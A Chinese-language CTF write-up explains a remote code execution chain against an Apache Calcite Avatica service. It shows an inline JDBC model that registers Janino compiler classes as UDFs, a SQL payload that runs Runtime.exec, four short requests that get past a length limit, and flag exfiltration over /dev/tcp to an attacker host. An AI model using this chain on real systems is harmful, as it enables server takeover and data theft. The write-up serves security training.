# great-sql

## 题目简述

服务暴露 Apache Calcite Avatica JSON 接口，并限制单个 JSON 请求长度。客户端可在 `openConnection.info.jdbcUrl` 中提供任意 `jdbc:calcite:model=inline:...` 模型；Calcite model 允许把公开 Java 类的方法注册为 SQL UDF。题目 classpath 中同时存在 Commons Compiler 的 `DemoBase` 与 Janino 的 `ClassBodyEvaluator`，二者组合后可从 SQL 编译并实例化攻击者提供的 Java class body，最终调用 `Runtime.exec`。

长度限制并未切断利用链，因为 Avatica 本来就是有状态协议：建连接、同步 schema、创建 statement 和执行 SQL 可以拆成四个短请求。

## 解题过程

### 1. 注册危险 Java 方法为 UDF

第一个 Avatica 请求使用：

```text
jdbc:calcite:model=inline:{version:1,schemas:[{name:0,functions:[
{className:'org.codehaus.commons.compiler.samples.DemoBase',methodName:'*'},
{className:'org.codehaus.janino.ClassBodyEvaluator',methodName:'*'}]}]}
```

模型把 `DemoBase` 和 `ClassBodyEvaluator` 的公开静态方法暴露给 schema `0`。之后发送 `connectionSync` 把当前 schema 设为 `0`，再发送 `createStatement`，保存响应中的 `statementId`。

### 2. 用 Janino 编译命令执行类体

第四个请求为 `prepareAndExecute`，SQL 结构为：

```sql
select createInstance(
  createObject(
    stringToType('java.io.StringReader'),
    '{try{Runtime.getRuntime().exec("COMMAND");}catch(Exception e){}}'
  )
)
```

`stringToType`/`createObject` 构造一个包含攻击类体的 `StringReader`，`createInstance` 让 Janino 编译并实例化它；实例初始化代码执行 `Runtime.getRuntime().exec(...)`。命令字符串中的反斜杠和双引号要同时满足 Java 与 JSON 两层转义。

### 3. 绕过 280 字节请求限制

不要把 Avatica 操作塞进一个数组。官方 `exp.py` 使用紧凑 JSON，删除空白与非必要字段，依次发送：

```text
openConnection
connectionSync
createStatement
prepareAndExecute
```

每个请求都单独检查 UTF-8 字节长度不超过 280。若复用空 connectionId 时收到 `Connection already exists`，先发 `closeConnection` 再重建；执行阶段必须采用服务返回的实际 statementId。

### 4. 取回 flag

预期利用执行 `/readflag`，再通过短的 shell 命令把输出送到攻击者可见的 OOB 通道。官方脚本用 `/dev/tcp/<host>/<port>`，并将命令缩短为通配 `/r*` 以控制 JSON 长度。没有出网时，也可分两次利用：第一次把 `/readflag` 输出写入 Web 可读文件，第二次注册或调用文件读取 UDF 将内容带回。

## 方法总结

本题不是传统 SQL 注入，而是数据库元模型把 Java 反射/编译能力暴露成了 UDF。安全边界应放在 JDBC URL 和允许注册的函数类上，而不是只过滤 SQL 文本。协议级长度限制也不能按单请求评估；Avatica 的连接状态允许攻击者自然分阶段。复现时应逐步确认连接、schema、statementId 和执行响应，避免把 command 失败误判为 inline model 未生效。
